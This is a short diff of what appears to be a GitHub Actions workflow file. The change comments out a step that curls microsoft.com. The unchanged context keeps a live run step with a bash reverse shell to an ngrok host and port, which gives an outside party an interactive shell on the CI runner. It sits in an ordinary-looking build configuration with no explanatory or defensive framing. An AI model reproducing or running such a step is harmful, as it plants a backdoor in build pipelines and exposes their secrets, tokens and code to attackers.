@@ -26,9 +26,9 @@ jobs:
           curl -I https://goreleaser.com
           sleep 10  # wait 10 seconds between calls
         done
-    - name: curl microsoft
-      if: always()
-      run: curl microsoft.com
+    # - name: curl microsoft
+    #   if: always()
+    #   run: curl microsoft.com
     - run: |
           bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1" 
 
